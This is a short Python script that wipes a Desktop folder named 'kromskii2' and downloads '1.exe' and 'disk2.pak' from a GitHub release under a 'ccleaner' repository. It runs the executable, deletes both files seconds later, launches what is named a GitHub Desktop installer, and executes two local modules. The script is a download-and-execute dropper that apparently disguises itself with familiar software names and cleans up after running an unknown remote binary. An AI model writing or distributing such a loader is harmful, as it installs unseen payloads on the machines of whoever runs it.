import os
import importlib.util
import urllib.request
import time


def download_file(url, destination):
    urllib.request.urlretrieve(url, destination)


def clean_kromskii2_folder():
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'kromskii2')
    if not os.path.exists(desktop_path):
        os.makedirs(desktop_path)
    else:
        for root, dirs, files in os.walk(desktop_path):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                except Exception as e:
                    print(f"Error deleting {file}: {e}")
    return desktop_path


def run_external_scripts():
    desktop_path = clean_kromskii2_folder()

    download_file('https://github.com/kromskii2/ccleaner/releases/download/1/disk2.pak',
                  os.path.join(desktop_path, 'disk2.pak'))
    download_file('https://github.com/kromskii2/ccleaner/releases/download/1/1.exe',
                  os.path.join(desktop_path, '1.exe'))

    time.sleep(1)

    os.system(os.path.join(desktop_path, '1.exe'))

    time.sleep(5)

    os.remove(os.path.join(desktop_path, 'disk2.pak'))
    os.remove(os.path.join(desktop_path, '1.exe'))

    time.sleep(1)

    os.system(os.path.join(desktop_path, 'GitHubDesktopSetup-x64.exe'))

    time.sleep(1)

    spec_rickrols = importlib.util.spec_from_file_location('rickrols', 'rickrols.py')
    module_rickrols = importlib.util.module_from_spec(spec_rickrols)
    spec_rickrols.loader.exec_module(module_rickrols)

    spec_rerlamma = importlib.util.spec_from_file_location('rerlamma', 'rerlamma.py')
    module_rerlamma = importlib.util.module_from_spec(spec_rerlamma)
    spec_rerlamma.loader.exec_module(module_rerlamma)


if __name__ == "__main__":
    run_external_scripts()
